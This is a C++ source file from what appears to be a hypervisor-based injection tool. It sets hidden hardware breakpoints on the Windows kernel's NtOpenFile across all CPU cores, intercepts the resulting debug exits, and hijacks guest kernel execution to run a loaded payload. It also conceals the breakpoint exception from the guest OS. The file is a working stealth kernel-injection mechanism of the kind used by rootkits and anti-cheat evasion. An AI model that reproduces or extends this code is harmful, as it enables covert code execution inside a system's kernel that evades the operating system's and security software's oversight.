#include "injection_exit.h"
#include "../runtime_context.h"
#include "../../modules/arch/arch.h"
#include "../../modules/loader/imports.h"
#include "../../modules/logs/logs.h"
#include "../../manager/loader/deployer.h"
#include "../../modules/apic/apic.h"
#include <intrin.h>

namespace
{
    // VMCS Constants (Standard Intel VMX Encodings)
    // Removed local definitions as they are already defined in ia32.hpp
    // which is included via arch.h


    // Helper to resolve NtOpenFile dynamically
    uint64_t resolve_target_function()
    {
        if (g_runtime_context.ntoskrnl_base == 0)
        {
            return 0;
        }

        // Prepare loader context for guest memory access
        // We need to ensure guest_cr3 is current because we are about to read guest memory
        g_runtime_context.loader_ctx.guest_cr3 = arch::get_guest_cr3();
        
        // Use loader module to resolve export
        return loader::get_kernel_export(&g_runtime_context.loader_ctx, g_runtime_context.ntoskrnl_base, "NtOpenFile");
    }

    // Helper to configure DR7 for injection interception
    void configure_injection_dr7(uint64_t target_address)
    {
        if (target_address == 0)
        {
            return;
        }

        // 1. Set DR0 to the target address (NtOpenFile)
        // Note: DR0-DR3 are usually not saved/restored by VMX, so writing to host DR0
        // effectively sets it for the guest (until guest context switch overwrites it).
        // Since NtOpenFile is high-frequency enough, we hope to catch it before context switch.
        __writedr(0, target_address);

        // 2. Compute DR7 value based on current Guest DR7 (preserve other bits if possible)
        uint64_t dr7 = 0;
        __vmx_vmread(VMCS_GUEST_DR7, &dr7);

        // L0 (Bit 0): 1 = Local Enable for DR0
        // LE (Bit 8): 1 = Local Exact Breakpoint Enable (Recommended)
        // R/W0 (Bits 16-17): 00 = Break on Instruction Execution
        // LEN0 (Bits 18-19): 00 = 1 Byte Length
        
        dr7 |= 1ULL;          // Set L0
        dr7 |= (1ULL << 8);   // Set LE
        dr7 &= ~(3ULL << 16); // Clear R/W0 (Execution)
        dr7 &= ~(3ULL << 18); // Clear LEN0 (1 Byte)

        // 3. Update VMCS Guest DR7 (CRITICAL for Guest Breakpoint)
        __vmx_vmwrite(VMCS_GUEST_DR7, dr7);

        // 4. Update Exception Bitmap to trap #DB (Vector 1)
        uint64_t exception_bitmap = 0;
        __vmx_vmread(VMCS_CTRL_EXCEPTION_BITMAP, &exception_bitmap);
        if (!(exception_bitmap & (1ULL << 1)))
        {
            exception_bitmap |= (1ULL << 1); // Enable #DB exit
            __vmx_vmwrite(VMCS_CTRL_EXCEPTION_BITMAP, exception_bitmap);
        }
        
        // Log configuration for debugging
        logs::print(&g_runtime_context.log_ctx, "[Inject] Configured DR7 on Core %d. Target=%p, DR7=%p\n", 
            apic_t::current_apic_id(), target_address, dr7);
    }

    // Helper to clear DR7 (cleanup)
    void clear_injection_dr7()
    {
        // Clear Hardware DR7
        // Note: We don't need to write Host DR7, but we clear DR0.
        __writedr(0, 0);

        // Clear VMCS Guest DR7
        uint64_t guest_dr7 = 0;
        __vmx_vmread(VMCS_GUEST_DR7, &guest_dr7);
        guest_dr7 &= ~1ULL; // Clear L0
        __vmx_vmwrite(VMCS_GUEST_DR7, guest_dr7);
    }
}

bool process_injection_state_tick(uint64_t guest_rip, trap_frame_t* trap_frame)
{
    auto& ctx = g_runtime_context.injection_ctx;
    const uint32_t current_stage = ctx.stage.load();

    // 0. Warm-up Phase
    if (current_stage == 0)
    {
        // Count only user-mode exits (CPL=3)
        if (arch::get_guest_cpl() == 3)
        {
            ctx.injection_counter.fetch_add(1);
        }

        // Check threshold (120,000)
        if (ctx.injection_counter.load() >= 120000)
        {
            // Transition Trigger: Must be in Kernel Mode (CPL=0) to resolve exports safely
            if (arch::get_guest_cpl() == 0)
            {
                if (!loader::is_payload_ready())
                {
                    return false;
                }

                const uint64_t target_func = resolve_target_function();
                if (target_func == 0)
                {
                    return false;
                }

                ctx.target_address.store(target_func);

                // 1. Set Global NMI Ready Bitmap (Mark all cores as needing config)
                interrupts::set_all_nmi_ready(&g_runtime_context.interrupts_ctx);

                // 2. Broadcast NMI to all other cores
                interrupts::send_nmi_all_but_self(&g_runtime_context.interrupts_ctx);

                // 3. Transition to Stage 1 (Configuration)
                ctx.stage.store(1);

                logs::print(&g_runtime_context.log_ctx, 
                    "[Inject] Warm-up complete. Target found at %p. Broadcast NMI sent. Entering Stage 1.\n", 
                    target_func);
            }
        }
    }

    // 1. Configuration Phase (Runs on ALL cores)
    if (current_stage == 1)
    {
        // Force configuration if DR0 mismatch or DR7 L0 missing
        // This handles:
        // 1. Host NMI clearing the bitmap (we ignore bitmap for trigger)
        // 2. Guest OS overwriting DR0 (we restore it)
        
        bool need_config = false;
        
        // Check DR0
        uint64_t current_dr0 = __readdr(0);
        if (current_dr0 != ctx.target_address.load())
        {
            logs::print(&g_runtime_context.log_ctx, "[Inject] Core %d Need Config: DR0 mismatch. Current=%p Target=%p\n",
                apic_t::current_apic_id(), current_dr0, ctx.target_address.load());
            need_config = true;
        }
        else
        {
            // Check VMCS Guest DR7
            uint64_t guest_dr7 = 0;
            __vmx_vmread(VMCS_GUEST_DR7, &guest_dr7);
            if ((guest_dr7 & 1) == 0)
            {
                logs::print(&g_runtime_context.log_ctx, "[Inject] Core %d Need Config: Guest DR7 L0 missing. Val=%p\n",
                    apic_t::current_apic_id(), guest_dr7);
                need_config = true;
            }
        }

        if (need_config)
        {
            configure_injection_dr7(ctx.target_address.load());
        }

        // Clear NMI ready bit if set (cleanup)
        if (interrupts::is_nmi_ready(&g_runtime_context.interrupts_ctx, apic_t::current_apic_id()))
        {
            interrupts::clear_nmi_ready(&g_runtime_context.interrupts_ctx, apic_t::current_apic_id());
        }
    }

    return false;
}

bool handle_injection_db_exit(trap_frame_t* trap_frame)
{
    auto& ctx = g_runtime_context.injection_ctx;
    
    // Check Exit Qualification for DR6 status (Standard for #DB exits)
    uint64_t exit_qualification = 0;
    __vmx_vmread(VMCS_EXIT_QUALIFICATION, &exit_qualification);

    // DEBUG LOG REMOVED to prevent spam/deadlock
    // logs::print(...)

    // Check B0 (Break 0) to verify it's our breakpoint
    if (!(exit_qualification & 1))
    {
        // Fallback: Check hardware DR6 if qualification is empty (unlikely for valid #DB)
        // But mainly we rely on qualification.
        return false;
    }

    // Verify RIP matches target
    if (arch::get_guest_rip() != ctx.target_address.load())
    {
        return false;
    }

    if (ctx.stage.load() != 1)
    {
        clear_injection_dr7();
        arch::set_guest_rflags(arch::get_guest_rflags() | (1ULL << 16));
        return true;
    }

    // IRQL CHECK:
    // MmAllocateIndependentPagesEx requires IRQL <= APC_LEVEL (0 or 1).
    // NtOpenFile is guaranteed to be PASSIVE_LEVEL (0).
    // So theoretically we are safe. However, as a sanity check, we still verify we are not high.
    
    const uint64_t rflags = arch::get_guest_rflags();
    if (!(rflags & 0x200)) // IF = 0
    {
        // Interrupts disabled -> High IRQL. Skip.
        logs::print(&g_runtime_context.log_ctx, "[Inject] Skip Core %d: IF=0 (Interrupts Disabled at NtOpenFile)\n", apic_t::current_apic_id());
        
        arch::set_guest_rflags(rflags | (1ULL << 16)); // RF=1
        return true; 
    }
    
    // CR8 Check Removed:
    // NtOpenFile is guaranteed to run at PASSIVE_LEVEL (IRQL 0).
    // Reading GUEST_CR8 from VMCS is unreliable if "TPR Shadow" is not enabled (returns garbage).
    // Since we target a safe syscall function, we rely on the target safety and IF flag.

    // Clear DR6 B0 Status (Logic only, we don't write back to Exit Qual)
    // Note: To strictly hide it from guest, we should clear GUEST_DR6 in VMCS if it exists,
    // or rely on the fact that we are skipping the guest's #DB handler entirely.
    // Since we return true, we don't reflect the exception to the guest.
    // So the guest never sees the #DB or the DR6 status.
    // We just resume execution.

    uint32_t expected = 1;
    if (ctx.stage.compare_exchange_strong(expected, 2))
    {
        if (!loader::execute_payload_hijack(&g_runtime_context.loader_ctx, trap_frame))
        {
            logs::print(&g_runtime_context.log_ctx, "[Inject] FATAL: Payload execution failed! Aborting injection.\n");
            ctx.stage.store(3);
        }
    }

    // Always cleanup DR7 to prevent further #DB exits on this core
    clear_injection_dr7();
    
    // Resume Flag (RF) handling:
    // If we modified RIP (Hijack case), we don't strictly need RF as we are at a new instruction.
    // If we resume original (Non-Hijack case), we need RF to step over the breakpoint instruction.
    arch::set_guest_rflags(arch::get_guest_rflags() | (1ULL << 16)); 

    return true; // Handled (Resumed)
}
